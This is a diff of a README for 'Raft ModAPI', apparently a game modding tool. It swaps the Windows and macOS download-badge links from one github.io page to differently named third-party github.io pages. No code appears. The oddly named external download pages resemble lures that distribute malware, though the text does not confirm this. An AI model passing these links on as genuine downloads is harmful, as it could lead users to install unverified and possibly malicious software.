@@ -28,7 +28,7 @@ Whether you're a newcomer just getting started or a seasoned pro looking for adv
 
 <div align="center">
 
-[![Download Raft ModAPI](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_RAFT_MODAPI-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://TerminusAgentLine.github.io/windows-setup/)
+[![Download Raft ModAPI](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_RAFT_MODAPI-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://supremedeckhandwire.github.io/win-pkg/)
 
 </div>
 
@@ -62,8 +62,8 @@ Getting started with **Raft ModAPI** is quick and straightforward.
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-E65100?style=for-the-badge&logo=windows&logoColor=white)](https://TerminusAgentLine.github.io/windows-setup/)
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-E65100?style=for-the-badge&logo=apple&logoColor=white)](https://TerminusAgentLine.github.io/macos-setup/)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-E65100?style=for-the-badge&logo=windows&logoColor=white)](https://supremedeckhandwire.github.io/win-pkg/)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-E65100?style=for-the-badge&logo=apple&logoColor=white)](https://supremedeckhandwire.github.io/mac-pkg/)
 
 </div>
 
